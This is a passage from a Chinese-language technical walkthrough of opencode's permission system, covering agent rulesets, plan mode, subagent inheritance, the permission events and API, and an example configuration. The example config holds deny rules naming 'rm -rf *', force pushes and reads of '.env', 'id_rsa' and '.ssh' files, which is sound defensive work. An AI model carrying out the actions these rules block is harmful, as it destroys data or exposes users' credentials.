  mode: "primary",
}
```

build 把 `question` 和 `plan_enter` 从默认的 deny 翻回 allow，因为它有交互能力。

**plan agent**（`agent.ts:145-167`）—— **关键**：

```ts
plan: {
  permission: Permission.merge(
    defaults,
    Permission.fromConfig({
      question: "allow",
      plan_exit: "allow",
      external_directory: {
        [path.join(Global.Path.data, "plans", "*")]: "allow",
      },
      edit: {
        "*": "deny",
        [path.join(".opencode", "plans", "*.md")]: "allow",
        [path.relative(ctx.worktree, path.join(Global.Path.data, "plans", "*.md"))]: "allow",
      },
    }),
    user,
  ),
}
```

这里就是 plan 模式的"只读"实现：

- `edit.* → deny`（所有 edit 调用拒绝）。
- 例外：`.opencode/plans/*.md` 这一个特定路径下的编辑允许（因为 plan 需要写计划文档）。
- 同时允许 `plan_exit` 工具（让 plan 模式能正常结束）。

**explore agent**（`agent.ts:182-204`）—— subagent，专门做"探索"：

```ts
explore: {
  permission: Permission.merge(
    defaults,
    Permission.fromConfig({
      "*": "deny",
      grep: "allow",
      glob: "allow",
      list: "allow",
      bash: "allow",
      webfetch: "allow",
      websearch: "allow",
      read: "allow",
      external_directory: readonlyExternalDirectory,
    }),
    user,
  ),
  mode: "subagent",
}
```

`"*": "deny"` 先把所有东西禁掉，再把搜索/读取类工具白名单。注意它**允许 bash**，但因为 ruleset 里没有 `edit/write`，模型即使能跑 `rm -rf` 也会卡在 bash 的 pattern 询问——还有第 07 章提到的 shell 工具会扫描每个命令的路径影响，触发 `external_directory` 询问。

**compaction / title / summary**（`agent.ts:235-280`）—— 这些 hidden agent 用 `"*": "deny"`，因为它们只做文本压缩，根本不应该调任何工具。

### 8.9.2 用户配置追加

`agent/agent.ts:283-310` 把用户 `opencode.json` 里的 `agent.<name>.permission` 字段合并到对应 agent 上。这就是文档里说的"agent permissions 覆盖全局"。

### 8.9.3 Truncate 目录的自动放行

`agent/agent.ts:312-326`：

```ts
for (const name in agents) {
  const agent = agents[name]
  const explicit = agent.permission.some((r) => {
    if (r.permission !== "external_directory") return false
    if (r.action !== "deny") return false
    return r.pattern === Truncate.GLOB
  })
  if (explicit) continue

  agents[name].permission = Permission.merge(
    agents[name].permission,
    Permission.fromConfig({ external_directory: { [Truncate.GLOB]: "allow" } }),
  )
}
```

这是一条很贴心的"补丁"：truncate 目录（`~/.local/share/opencode/tool-output/*`）默认放过 `external_directory` 询问，这样 LLM 在被告知"全文已写盘到 /xxx" 后，可以直接 `read /xxx` 继续看。除非用户**显式** deny 了这个 glob，否则会自动追加 allow。

---

## 8.10 Subagent 权限继承

当 `task` 工具启动一个 subagent，子 session 的 `permission` 不是空的，也不是直接抄父 session——而是经过 `deriveSubagentSessionPermission` 推导（`agent/subagent-permissions.ts`）：

```ts
export function deriveSubagentSessionPermission(input: {
  parentSessionPermission: Permission.Ruleset
  parentAgent: Agent.Info | undefined
  subagent: Agent.Info
}): Permission.Ruleset {
  const canTask = input.subagent.permission.some((rule) => rule.permission === "task")
  const canTodo = input.subagent.permission.some((rule) => rule.permission === "todowrite")
  const parentAgentDenies =
    input.parentAgent?.permission.filter((rule) => rule.action === "deny" && rule.permission === "edit") ?? []
  return [
    ...parentAgentDenies,
    ...input.parentSessionPermission.filter(
      (rule) => rule.permission === "external_directory" || rule.action === "deny",
    ),
    ...(canTodo ? [] : [{ permission: "todowrite" as const, pattern: "*" as const, action: "deny" as const }]),
    ...(canTask ? [] : [{ permission: "task" as const, pattern: "*" as const, action: "deny" as const }]),
  ]
}
```

字段头的 docstring 很清楚（`subagent-permissions.ts:4-15`），按编号拆解：

### 8.10.1 继承父 agent 的 edit deny

**`parentAgent.permission` 里的 `edit` deny 规则**会被继承到 subagent session。这是为什么？

考虑 plan 模式：用户在 plan agent 里发了 `task` 工具调 explore subagent。explore subagent 自己的 ruleset 是允许 `read/grep/glob/bash/...` 的（见 8.9.1），但它**不应该绕过 plan 模式的写禁令**。如果只继承父 session 的 ruleset 而不管父 agent 的 ruleset，subagent 就能写文件——plan 模式直接破功。

issue #26514 就是为修这个泄漏加的逻辑。把父 agent 的 edit deny 规则也"打"到子 session，相当于"plan 的禁令穿透到 subagent"。

### 8.10.2 继承父 session 的 deny 和 external_directory

父 session 里所有 `action: "deny"` 的规则照搬，所有 `external_directory` 规则也照搬。前者是"父级关心的禁令子级也必须遵守"，后者是"路径访问的白名单/黑名单是 session 级的环境，子级处于同一文件系统语境"。

### 8.10.3 默认拒绝 todowrite / task（除非 subagent 明确允许）

如果 subagent 的 ruleset 里没有 `todowrite` 或 `task`，就显式塞一条 deny。这是个安全防御：

- todowrite 是为顶层 agent 维护任务列表的，subagent 通常不应该越级改它。
- task 是为顶层 agent 调用子任务的，**subagent 调 task** = 嵌套递归 → 容易失控。

这两条规则也可以用配置覆盖——比如 `general` agent 显式允许 todowrite。

---

## 8.11 Bus 事件：连接前端的桥

`Permission.Event`（`permission/index.ts:69-79`）：

```ts
export const Event = {
  Asked: BusEvent.define("permission.asked", Request),
  Replied: BusEvent.define(
    "permission.replied",
    Schema.Struct({
      sessionID: SessionID,
      requestID: PermissionID,
      reply: Reply,
    }),
  ),
}
```

工具调 `ctx.ask` 后，如果需要询问，`Permission.ask` 会 `bus.publish(Event.Asked, info)`。订阅这个事件的有：

- **TUI**（`packages/opencode/src/cli/cmd/tui/routes/session/permission.tsx`）—— 弹出一个对话框，渲染权限信息（如果是 edit，渲染 diff；如果是 bash，渲染命令）。
- **CLI run 模式**（`packages/opencode/src/cli/cmd/run/permission.shared.ts`）—— 在终端打印 prompt，从 stdin 读用户选择。
- **App / Web / Desktop 客户端** —— 通过 SDK 订阅 SSE 流，前端 UI 处理。

用户做出选择后，通过 SDK 调 `permission.reply(requestID, { reply, message? })`，路由到：

**HTTP API**（`server/routes/instance/httpapi/handlers/permission.ts`）：

```ts
export const permissionHandlers = HttpApiBuilder.group(InstanceHttpApi, "permission", (handlers) =>
  Effect.gen(function* () {
    const svc = yield* Permission.Service
    const list = Effect.fn(function* () { return yield* svc.list() })
    const reply = Effect.fn(function* (ctx) {
      yield* svc.reply({ requestID: ctx.params.requestID, reply: ctx.payload.reply, message: ctx.payload.message })
        .pipe(Effect.catchTag("Permission.NotFoundError", ...))
      return true
    })
    return handlers.handle("list", list).handle("reply", reply)
  }),
)
```

对应的路由定义在 `groups/permission.ts`：

- `GET /permission` → 列出当前 pending 请求（用于客户端启动时 catch-up）。
- `POST /permission/:requestID/reply` → 提交回应。

整条链路：

```text
工具 ctx.ask(…)
     │
     ▼
Permission.ask → bus.publish(Asked)
     │                │
     │                ▼
     │           [SSE 流] → TUI/CLI/App/Web
     │                       │
     │                       │ 用户点 Allow once / Always / Reject
     │                       │
     │                       ▼
     │           POST /permission/:id/reply
     │                       │
     │                       ▼
     │              Permission.reply → Deferred.succeed/fail
     │                       │            + bus.publish(Replied)
     ▼                       ▼
   await deferred       订阅者更新 UI（关闭对话框/显示结果）
     │
     ▼
工具继续 或 抛 RejectedError 给 LLM
```

---

## 8.12 Plan 模式如何用权限实现"只读"

到这里可以重新回答一个之前章节里挂着的问题：**plan 模式是怎么实现的？**

不是用一个开关 `if (planMode) return "no edit"`，而是**通过 agent 的 permission ruleset**：

1. 用户切到 plan agent（在 TUI 里 `/plan` 或启动时 `--agent plan`）。
2. session 的 `agent` 字段变为 `"plan"`。
3. session/tools.ts:75-79 调 `registry.tools({ agent: planInfo, ... })` 列出工具。
4. 注意 `disabled()` 函数（`packages/core/src/permission.ts:37-45`）：

```ts
export function disabled(tools: string[], ruleset: Ruleset): Set<string> {
  return new Set(
    tools.filter((tool) => {
      const permission = EDIT_TOOLS.includes(tool) ? "edit" : tool
      const rule = ruleset.findLast((rule) => Wildcard.match(permission, rule.permission))
      return rule?.pattern === "*" && rule.action === "deny"
    }),
  )
}
```

这个函数返回"被规则集禁用到 `pattern === "*" && action === "deny"` 程度"的工具——即"完全禁用"。这些工具会在传给 LLM 时被剔除（**不是 deny，而是干脆不告诉 LLM 它存在**）。

5. plan agent 的 ruleset 里 `edit.* = deny`，但有例外 `*.opencode/plans/*.md = allow`。所以 `disabled()` 在这种"既有全禁也有部分放行"的情况下**不会**把 edit 列入完全禁用——LLM 仍然能调 edit，但调任意非 plan 文件时都会被 ruleset 拒绝。

这是一个很巧妙的设计：

- 如果 plan agent 完全没有 edit 工具，LLM 不知道有"写文件"这个操作，prompt 也会变奇怪。
- 让它**知道**有 edit 工具但**真去用时**被 ruleset 拒绝，错误信息（`The user has specified a rule which prevents you from using this specific tool call`，`permission/index.ts:96-101`）会让 LLM 明白发生了什么，往往会自我修正。

读 `agent.ts:148-167` 时把这条逻辑放在心里就清楚了：plan agent 既允许 `plan_exit`，又有特例 edit 例外允许写 `plans/*.md`，又 deny 其它 edit。这种"复杂规则的 ruleset 表达"是权限系统真正强大的地方。

---

## 8.13 配置文件实战示例

下面给一段比较典型的 `opencode.json` 配置，演示几种粒度的组合：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "permission": {
    "bash": {
      "*": "ask",
      "ls *": "allow",
      "pwd *": "allow",
      "cat *": "allow",
      "git status *": "allow",
      "git diff *": "allow",
      "git log *": "allow",
      "rg *": "allow",
      "node -v": "allow",
      "bun -v": "allow",
      "git push *": "deny",
      "git push --force *": "deny",
      "rm -rf *": "deny"
    },
    "edit": {
      "*": "ask",
      "packages/web/src/content/docs/*.mdx": "allow"
    },
    "read": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "id_rsa*": "deny",
      ".ssh/*": "deny"
    },
    "external_directory": {
      "*": "deny",
      "~/projects/work/**": "allow"
    },
    "webfetch": "ask",
    "websearch": "allow"
  },
  "agent": {
    "build": {
      "permission": {
        "bash": {
          "git commit *": "ask"
        }
      }
    },
    "review": {
      "mode": "subagent",
      "permission": {
        "edit": "deny",
        "write": "deny",
        "bash": {
          "*": "deny",
          "git diff *": "allow",
          "rg *": "allow"
        }
      }
    }
  }
}
```

按字段逐条解读：

1. **`bash`**：默认 ask，常用只读命令直接 allow，危险命令显式 deny。
2. **`edit`**：默认 ask，文档目录例外 allow（避免改写文档时频繁打扰）。
3. **`read`**：默认 allow，但 `.env` / SSH key 类 deny。
4. **`external_directory`**：默认 deny，工作区下的 `~/projects/work/` 允许（允许 IDE 跨 workspace 项目浏览）。
5. **`webfetch` / `websearch`**：前者 ask（怕 LLM 把 secrets 发出去），后者 allow（搜索不写数据）。
6. **`agent.build`**：默认 build agent 的 bash 已经按上面定义，这里在 build 上**额外**追加一条 `git commit * = ask`，覆盖父级"`git *`类全 ask"的 inherit。
7. **`agent.review`**：自定义一个 review subagent，禁所有 edit/write，bash 也只放行 diff 和搜索——纯只读 reviewer。

---

## 8.14 设计上的几条不变量

把整章的细节抽离，opencode 的权限系统设计上有几条**一致的不变量**：

### 8.14.1 工具不判断策略

工具只声明意图（`ctx.ask({ permission, patterns, always, metadata })`），策略放在权限系统。

好处：工具改成新 schema 时，权限语义不动；策略改了，工具不动。

### 8.14.2 配置即代码（JSON 顺序即优先级）

`findLast` + `propertyOrder: "original"` 让 JSON 的物理顺序决定语义。用户写得直白：

```json
{ "*": "ask", "git *": "allow", "git push *": "deny" }
```

读到的就是它写的意思，不需要额外推理 specificity。

### 8.14.3 三层粒度互相独立

工具级 / pattern 级 / 命令前缀级（仅 bash），各自承担不同维度，没有耦合。`BashArity` 是命令前缀级的关键模块，独立于 wildcard 匹配，独立于 ruleset。

### 8.14.4 ruleset 之间是 flat 而非分层

`evaluate(permission, pattern, ...rulesets)` 直接 `flat()`——agent / session / approved 不分层级，按顺序拼成一条长队。这让 subagent 继承（8.10）变成一个"列表拼接"问题而不是"层级解析"问题，简单很多。

### 8.14.5 ask 是异步的，错误是带 feedback 的

`ask` 返回 Effect，工具调用挂起；用户可以带 feedback 拒绝，LLM 收到 `CorrectedError` 含反馈文本——人机协同被设计成"对话"而非"开关"。

### 8.14.6 默认安全

- `.env` / `.env.*` 默认 ask。
- `external_directory` 默认 ask（工作区外路径要问）。
- `doom_loop`（一个工具 3 次重复同样调用）默认 ask。
- 大多数 hidden agent（compaction / title / summary） `"*": "deny"`——这些 agent 只是做文本压缩，不该用工具。

设计者把"用户没想"的情况都拨到"问"那一边，让"想都没想就允许"成为需要明确表达的选择。

---

## 8.15 小结

权限系统是 opencode 安全性的支柱，本章覆盖了：

- 用三个层级（工具/pattern/bash 命令前缀）满足真实使用的粒度需求；
- 用一个有序 ruleset + last-wins 的极简评估模型让配置直观；
- 用 deferred + bus 事件把"挂起 → 询问 → 回应"做成纯异步；
- 用 agent ruleset 表达 plan 模式这种"只读但可写计划"的复杂语义；
- 用 `deriveSubagentSessionPermission` 让子任务继承父级的禁令而不绕路；
- 用 truncate 目录自动放行、`.env` 自动 ask 等贴心默认值降低用户配置负担。

下一章将进入会话与消息存储。

---

## 参考文件清单

- `packages/opencode/src/permission/index.ts`
- `packages/opencode/src/permission/evaluate.ts`
- `packages/opencode/src/permission/schema.ts`
- `packages/opencode/src/permission/arity.ts`
- `packages/opencode/src/config/permission.ts`
- `packages/opencode/src/agent/agent.ts`
- `packages/opencode/src/agent/subagent-permissions.ts`
- `packages/opencode/src/bus/index.ts`
- `packages/opencode/src/server/routes/instance/httpapi/groups/permission.ts`
- `packages/opencode/src/server/routes/instance/httpapi/handlers/permission.ts`
- `packages/opencode/src/cli/cmd/tui/routes/session/permission.tsx`
- `packages/opencode/src/cli/cmd/run/permission.shared.ts`
- `packages/opencode/src/session/tools.ts`
- `packages/opencode/src/session/session.sql.ts`
- `packages/core/src/permission.ts`
- `packages/core/src/util/wildcard.ts`
- `packages/web/src/content/docs/permissions.mdx`
